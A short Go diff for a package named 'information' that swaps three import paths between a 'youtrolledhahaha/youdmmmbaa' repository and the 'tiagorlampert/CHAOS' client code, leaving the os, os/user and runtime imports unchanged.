@@ -1,9 +1,9 @@
 package information
 
 import (
-	"github.com/youtrolledhahaha/youdmmmbaa/client/app/entities"
-	"github.com/youtrolledhahaha/youdmmmbaa/client/app/services"
-	"github.com/youtrolledhahaha/youdmmmbaa/client/app/utils/network"
+	"github.com/tiagorlampert/CHAOS/client/app/entities"
+	"github.com/tiagorlampert/CHAOS/client/app/services"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 	"os"
 	"os/user"
 	"runtime"
